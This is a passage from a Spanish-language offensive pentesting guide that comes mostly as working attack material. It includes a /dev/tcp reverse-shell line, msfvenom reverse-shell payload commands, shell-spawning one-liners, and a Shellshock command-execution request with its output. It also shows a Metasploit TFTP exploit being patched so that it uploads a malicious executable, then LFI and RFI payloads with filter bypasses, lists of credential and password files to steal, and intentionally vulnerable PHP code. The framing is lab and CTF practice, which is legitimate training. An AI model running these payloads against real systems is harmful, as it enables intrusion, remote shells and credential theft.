p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
```

Así mismo, podemos hacer uso de Metasploit para la creación de nuestros archivos maliciosos:

**PHP (Metasploit)**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.php
```

**ASP (No Metasploit)**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp &gt; shell.asp
```

**WAR (Sesión vía Netcat)**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war &gt; shell.war
```

**JSP (Sesión vía Netcat)**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.jsp
```

#### Spawning a TTY Shell

Aunque en el apartado de **Tratamiento de la TTY** en la sección de Pentesting para Linux, detallo una técnica para mejorar y construir una Shell totalmente interactiva, sí que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuación algunas de ellas:

* python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
* echo os.system('/bin/bash') 
* /bin/sh -i
* perl -e 'exec &quot;/bin/sh&quot;;'
* perl: exec &quot;/bin/sh&quot;;
* ruby: exec &quot;/bin/sh&quot;
* lua: os.execute('/bin/sh')
* exec &quot;/bin/sh&quot; (Desde IRB)
* :!bash (Desde vi)
* :set shell=/bin/bash:shell (Desde vi)
* !sh (Desde nmap)
* find /etc/passwd -exec /bin/bash \;

#### Compilado de Exploits para Windows

Desde Linux, a la hora de compilar algunos de los exploits que figuren en **Searchsploit** (generalmente en C), aplicaremos el siguiente comando:

```bash
i686-w64-mingw32-gcc exploit.c -o exploit
```

Para máquinas Windows de 32 bits, aplicamos el siguiente comando:

```bash
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
```

#### Squid Proxy

Alguna que otra máquina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena máquina para practicar el concepto es la máquina **SickOS 1.1** de VulnHub.

La idea es la siguiente, presento el reporte de un escaneo a modo de ejemplo:

```bash
TCP: 22     SSH  OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)

TCP: 3128   HTTP-Proxy  Squid http proxy 3.1.19
```

Como vemos, sólo figuran esos 2 puertos, sin embargo... el uso del _Squid_ nos puede servir para descubrir un par de puertos más. **Squid** no es más que un servidor _proxy_ para web con caché. 

Aunque orientado principalmente a HTTP y HTTPS, soporta también otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:

**Proxy con caché de HTTP, FTP, y otros protocolos de internet**

Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de caché especializado en el cual almacena de forma local las páginas consultadas recientemente por los usuarios.

Tan interesante resulta la utilidad que hasta **Metasploit** cuenta con su propio módulo de enumeración de SQUID (**auxiliary/scanner/http/squid_pivot_scanning**), desde donde podemos descubrir nuevos puertos que figuren abiertos.

Podemos configurar un escaneo desde **nikto** para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta información relevante sobre el mismo:

```bash
$~ nikto -h direccionIP -useproxy http://direccionIP:puerto
```

Algo interesante es aprovechar la configuración de Firefox para desde la pestaña '_Network_', añadir un nuevo '_Manual proxy configuration_', el cual como campo **HTTP Proxy** disponga la IP del equipo y como puerto el que figure como servicio **Squid Proxy**. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.

Las consultas las podemos realizar también desde **curl**, empleando para ello una sintaxis como la que se define a continuación:

```bash
$~ curl --proxy ip:puerto http://ip/cgi-bin/status # A modo de ejemplo
```

Suponiendo que la web posteriormente es vulnerable a un ataque **ShellShock**, podríamos realizar la siguiente petición para ejecutar comandos sobre el sistema:

```bash
curl -v --proxy ip:puerto \
  http://ip/cgi-bin/status \ 
  -H &quot;Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit&quot;
```

Obteniendo la siguiente respuesta del lado del servidor:

```bash
*   Trying ip...
* Connected to ip (ip) port puerto (#0)
* HTTP 1.0, assume close after body
uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Closing connection 0
```

#### Metasploit Debugging

Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotación exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ningún tipo de _Verbose_. Para lidiar con esto, existe una pequeña utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecución, permitiéndonos así saber qué valores están tomando todas las variables así como conocer si se están recogiendo bien los valores que fijamos desde las opciones de configuración.

Otra opción también recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (útil para ver cómo viaja nuestra petición), y luego enruta al Host remoto.

**1. Pry-ByeBug**

Antes que nada, para evitar que nuestro Metasploit corrompa, creamos una instancia del recurso sobre el directorio **/opt**:

```bash
$~ cp -r /usr/share/metasploit-framework /opt/.
```

Una vez hecho, creamos el siguiente recurso en **~/.pryrc**:

```bash
if defined?(PryByebug)
  Pry.commands.alias_command 'c', 'continue'
  Pry.commands.alias_command 's', 'step'
  Pry.commands.alias_command 'n', 'next'
  Pry.commands.alias_command 'f', 'finish'
end

Pry::Commands.command /^$/, &quot;repeat last command&quot; do
  _pry_.run_command Pry.history.to_a.last
end
```

Nos resultará de utilidad para poder jugar con **Alias** en vez de escribir la instrucción entera. Aplicamos el siguiente comando para instalar **pry-byebug**:

```bash
$~ gem 'pry-byebug'
```

Una vez hecho, abrimos nuestro recurso **/opt/metasploit-framework/msfconsole** con nuestro editor preferido y añadimos como requerimiento el **pry-byebug** de la siguiente forma:

```bash
#
# Standard Library
#

require 'pathname'
require 'pry-byebug' # Nueva línea a insertar, las demás están por defecto.

if ENV['METASPLOIT_FRAMEWORK_PROFILE'] == 'true'
```

Para poner un caso práctico, vamos a ponerlo en práctica con la máquina **Dropzone** de HackTheBox. Esta máquina se puede comprometer a través de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.

El servicio a atacar es el **TFTP**, y el módulo es el **exploit/windows/tftp/distinct_tftp_traversal**. Este exploit, cuenta con las siguientes configuraciones:

```bash
Module options (exploit/windows/tftp/distinct_tftp_traversal):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows
```

En este caso, podemos aplicar un **LFI** sobre el servicio, siendo la variable **DEPTH** la correspondiente al número de veces que queremos retroceder hasta llegar a la ruta raíz. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.

¿Cómo podríamos haber sabido esto sin mirar el código?, **pry-byebug** será la respuesta a nuestros problemas.

Lo que haremos será generar una instancia del módulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #searchsploit -m exploits/windows/webapps/41714.rb
  Exploit: Distinct TFTP 3.10 - Writable Directory Traversal Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/41714/
     Path: /usr/share/exploitdb/exploits/windows/webapps/41714.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /home/s4vitar/Desktop/41714.rb


┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb
```

Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razón. Una vez hecho, dado que hemos importado la utilidad **pry-byebug** en la nueva instancia de **msfconsole**, lo que nos queda es establecer un **BreakPoint** sobre el módulo que queremos Debuggear. 

Para ello, abrimos la instancia del módulo, y añadimos la siguiente línea (lo haré en la siguiente porción de código):

```bash
  def exploit
    peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;

    # Setup the necessary files to do the wbemexec trick
    binding.pry # &lt;-------------------------------- Nueva línea que hemos añadido
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
```

¿Qué consguimos con esto?, vamos a comprobarlo. Correremos el **msfconsole** desde la ruta **/opt/metasploit-framework/msfconsole**, posteriormente seleccionaremos el nuevo módulo clonado, setearemos el **DEPTH** a 0, configuramos el resto de variables y le daremos a **run**:

```bash
┌─[✗]─[root@parrot]─[/opt/metasploit-framework]
└──╼ #/opt/metasploit-framework/msfconsole -q
[*] Starting persistent handler(s)...
msf &gt; use exploit/windows/tftp/exploit_tftp 
msf exploit(windows/tftp/exploit_tftp) &gt; show options

Module options (exploit/windows/tftp/exploit_tftp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows


msf exploit(windows/tftp/exploit_tftp) &gt; set DEPTH 0
DEPTH =&gt; 0
msf exploit(windows/tftp/exploit_tftp) &gt; set RHOST 192.168.1.12
RHOST =&gt; 192.168.1.12
msf exploit(windows/tftp/exploit_tftp) &gt; run
```

Una vez hecho, obtendremos los siguientes resultados:

```bash
msf exploit(windows/tftp/exploit_tftp) &gt; run

[*] Started reverse TCP handler on 192.168.1.51:4444 
Found plugin pry-byebug, but could not require 'pry-byebug'
cannot load such file -- pry-byebug

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
 =&gt;  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = &quot;../&quot; * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
     97:   upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status(&quot;#{peer} - Uploading .mof...&quot;)
    104:   upload(&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;, mof)
    105: end

[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;
```

En este preciso instante, nos situaríamos en la línea 86 del código del programa, manteniendo el mismo en estado de pausa (esto es así debido a que es en la línea superior donde hemos fijado el Breakpoint).

Llegados a este punto, si nos fijamos, en esa misma línea se va a almacenar un valor para la variable exe_name, ¿podríamos ver el valor que se almacena en dicha variable?, la respuesta es sí... para ello necesitamos avanzar una instrucción en la línea del programa para posteriormente ver su contenido. Lo haríamos de la siguiente forma:

```bash
[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; n

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 87 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
 =&gt;  87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = &quot;../&quot; * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
     97:   upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status(&quot;#{peer} - Uploading .mof...&quot;)
    104:   upload(&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;, mof)
    105: end

[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; exe_name
=&gt; &quot;xMDsIBr.exe&quot;
[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;
```

Donde como vemos, el valor que está almacenando dicha variable es **xMDsIBr.exe**. De igual manera, podríamos ver como las variables **depth** y **levels** no toman el valor que deberían. Para ello, podremos establecer un Breakpoint en la línea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.

Aplicamos los siguientes comandos:

```bash
[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96

  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 

      93:     levels = &quot;../&quot; * depth
    94: 
    95:     # Upload the malicious executable to C:\Windows\System32\
 =&gt; 96:     print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
    97:     upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
    98: 
    99:     # Let the TFTP server idle a bit before sending another file


[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c

  Breakpoint 1. First hit

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     93:   levels = &quot;../&quot; * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
 =&gt;  96:   print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
     97:   upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status(&quot;#{peer} - Uploading .mof...&quot;)
    104:   upload(&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;, mof)
    105: end

[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth
=&gt; 10
[4] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels
=&gt; &quot;../../../../../../../../../../&quot;
[5] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;
```

Como vemos, el valor de la variable **levels** es (**../../../../../../../../../../**), lo que hace que nos planteemos que no se está almacenando correctamente el valor de nuestro **DEPTH**. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente línea del programa:

```bash
92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
```

Donde como vemos, se especifica claramente que en caso de que el valor de **DEPTH** valga 0, esta se igualará a 10. Por lo que, deberíamos cambiar la declaración a lo siguiente:

```bash
92:   depth  = datastore['DEPTH']
```

Una vez hecho, podremos ver como los valores de **DEPTH** y de **levels** son declarados correctamente:

```bash
msf exploit(windows/tftp/exploit_tftp) &gt; show options

Module options (exploit/windows/tftp/exploit_tftp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   DEPTH  10               no        Levels to reach base directory
   RHOST                   yes       The remote TFTP server address
   RPORT  69               yes       The remote TFTP server port


Exploit target:

   Id  Name
   --  ----
   0   Distinct TFTP 3.10 on Windows


msf exploit(windows/tftp/exploit_tftp) &gt; set DEPTH 0
DEPTH =&gt; 0
msf exploit(windows/tftp/exploit_tftp) &gt; set RHOST 192.168.1.42
RHOST =&gt; 192.168.1.42
msf exploit(windows/tftp/exploit_tftp) &gt; run

[*] Started reverse TCP handler on 192.168.1.51:4444 
Found plugin pry-byebug, but could not require 'pry-byebug'
cannot load such file -- pry-byebug

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
 =&gt;  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = datastore['DEPTH']
     93:   levels = &quot;../&quot; * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
     96:   print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
     97:   upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status(&quot;#{peer} - Uploading .mof...&quot;)
    104:   upload(&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;, mof)
    105: end

[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96

  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) 

      93:     levels = &quot;../&quot; * depth
    94: 
    95:     # Upload the malicious executable to C:\Windows\System32\
 =&gt; 96:     print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
    97:     upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
    98: 
    99:     # Let the TFTP server idle a bit before sending another file


[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c

  Breakpoint 1. First hit

From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:

     81: def exploit
     82:   peer = &quot;#{datastore['RHOST']}:#{datastore['RPORT']}&quot;
     83: 
     84:   # Setup the necessary files to do the wbemexec trick
     85:   binding.pry
     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'
     87:   exe      = generate_payload_exe
     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'
     89:   mof      = generate_mof(mof_name, exe_name)
     90: 
     91:   # Configure how deep we want to traverse
     92:   depth  = datastore['DEPTH']
     93:   levels = &quot;../&quot; * depth
     94: 
     95:   # Upload the malicious executable to C:\Windows\System32\
 =&gt;  96:   print_status(&quot;#{peer} - Uploading executable (#{exe.length.to_s} bytes)&quot;)
     97:   upload(&quot;#{levels}WINDOWS\\system32\\#{exe_name}&quot;, exe)
     98: 
     99:   # Let the TFTP server idle a bit before sending another file
    100:   select(nil, nil, nil, 1)
    101: 
    102:   # Upload the mof file
    103:   print_status(&quot;#{peer} - Uploading .mof...&quot;)
    104:   upload(&quot;#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}&quot;, mof)
    105: end

[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth
=&gt; 0
[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels
=&gt; &quot;&quot;
[4] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; 
```

Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya queda claro la funcionalidad del **pry-byebug**.

**2. Burpsuite**

Otra opción para los menos valientes (aunque a veces también la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pestaña de Proxies (**Options**), añadimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pestaña **Request Handling**, debe redireccionar al Host víctima así como al puerto real donde se encuentre el servicio configurado que queremos analizar.

Lo que conseguimos con esto, es que de visualizar el recurso **http://localhost:4646**, nos cargue el mismo contenido que el del servicio web del Host víctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) así como el puerto 4646 para que todo el tráfico sea interceptado desde Burpsuite y posteriormente redireccionado al Host víctima. Esto nos permite analizar por ejemplo desde el **Repeater** cómo es la respuesta del lado del servidor una vez se envía el exploit al Host víctima.

### Pentesting Web

#### LFI

Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un **Directory Path Transversal**.

A modo de ejemplo, presento a continuación un script en PHP con dicha vulnerabilidad:

```php
&lt;?php
    $file = $_REQUEST['file'];
    echo include($file);
?&gt;
```

Suponiendo que el fichero se llama _file.php_, si desde la URL efectuamos la siguiente búsqueda:

`http://localhost/file.php?file=/etc/passwd`

Veremos cómo se nos lista el fichero passwd del equipo Linux local. Habrán ocasiones en las que tengamos que recorrer un par de directorios hacia atrás para visualizar el recurso:

`http://localhost/file.php?file=../../../../../etc/passwd`

Así como incorporar un **%00** para el bypassing de restricciones implementadas:

`http://localhost/file.php?file=../../../../../etc/passwd%00`

Otra forma también de bypassear posibles restricciones es añadiendo un interrogante al final de la petición:

`http://localhost/file.php?file=../../../../../etc/passwd?`

Por [aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.

Otra consideración a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensión **.php** estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:

`http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php`

La idea para no ver **PD9waHAKCSNQcnVlYmEKPz4K1** desde la web, es aplicar el siguiente comando desde terminal:

```bash
$~ curl --silent http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php | base64 -d 2&gt;/dev/null

&lt;?php
	#Prueba
?&gt;
```

Donde como vemos, se consigue visualizar el recurso PHP.

Recursos interesantes siempre a mirar son los siguientes:

```bash
/etc/issue 
/etc/motd 
/etc/passwd 
/etc/group 
/etc/resolv.conf
/etc/shadow
/home/[USERNAME]/.bash_history o .profile
~/.bash_history o .profile
$USER/.bash_history o .profile
/root/.bash_history o .profile
/etc/mtab  
/etc/inetd.conf  
/var/log/dmessage
.htaccess
config.php
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/apache/error.log
/var/log/apache/access.log
/var/log/httpd/error_log
/var/log/access_log
/var/log/mail
/var/log/sshd.log
/var/log/vsftpd.log
.bash_history
.mysql_history
.my.cnf
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

Así como los siguientes en máquinas Windows:

```bash
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini
c:\Program Files\Apache Group\Apache\logs\access.log  
c:\Program Files\Apache Group\Apache\logs\error.log
c:\WINDOWS\TEMP\  
c:\php\sessions\  
c:\php5\sessions\  
c:\php4\sessions\
windows\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

#### LFI Code Examples

A continuación, se detallan algunas vulnerabilidades de tipo **LFI** con el código del lado del servidor, para poder practicar en local dichas técnicas.

**Basic Includes**

Código del servidor:

```php
&lt;?php
$file = $_GET['file'];

if(isset($file))
{
  include(&quot;$file&quot;);
}
```

Petición legítima:

```bash
http://localhost/index.php?file=contact.php
```

Petición malintencionada:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #curl --silent http://localhost/index.php?file=/etc/subgid
s4vitar:100000:65536
```

**Directory traversal attack**

Código del servidor:

```php
&lt;?php
$file = $_GET['file'];
if(isset($file))
{
  include(&quot;lib/functions/$file&quot;);
}
```

Petición legítima:

```bash
http://localhost/index.php?file=contact.php
```

Petición malintencionada:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #curl --silent http://localhost/index.php?file=../../../../../etc/subgid
s4vitar:100000:65536
```

**Null Byte Injection**

Código del servidor:

```php
&lt;?php
$file = $_GET['file'];
if(isset($file))
{
  include(&quot;lib/functions/$file.php&quot;);
}
```

Petición legítima:

```bash
http://localhost/index.php?file=contact
```

Petición malintencionada:

```bash
curl --silent &quot;http://localhost/index.php?file=../../../../../../../../../etc/subgid%00&quot;
s4vitar:100000:65536
```

Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la versión **5.3.4**.

**Filter Evasion**

Código del servidor:

```php
&lt;?php
$file = str_replace('../', '', $_GET['file']);
if(isset($file))
{
  include(&quot;lib/functions/$file&quot;);
}
```

Petición malintencionada:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #curl --silent &quot;http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid&quot;
s4vitar:100000:65536
┌─[root@parrot]─[/var/www/html]
└──╼ #curl --silent &quot;http://localhost/index.php?file=....//....//....//....//....//etc/subgid&quot;
s4vitar:100000:65536
┌─[root@parrot]─[/var/www/html]
```

**Double encoding**

Para continuar evitando filtro, se puede hacer uso de una doble codificación. Esto es, codificamos los datos por primera vez:

```bash
%2E%2E%2Fetc%2Fpasswd
```

Y ahora codificamos el **%**:

```bash
%252E%252E%252Fetc%252Fpasswd
```

**Path Truncation**

Sobre la solicitud en la que pretendemos hacer **LFI**, añadimos mil veces **./** para el recurso **../../../../etc/passwd/././././././&lt;...&gt;/.php**. Una vez el nombre del archivo cuenta con más de 4.096 bytes, se elimina la parte más larga. De esta forma, nuestra petición se convierte en **../../../../etc/passwd**.

#### RFI

Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.

Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:

`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
path=http://nuestraIP/wp-load.php`

De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.

#### LFI to RCE

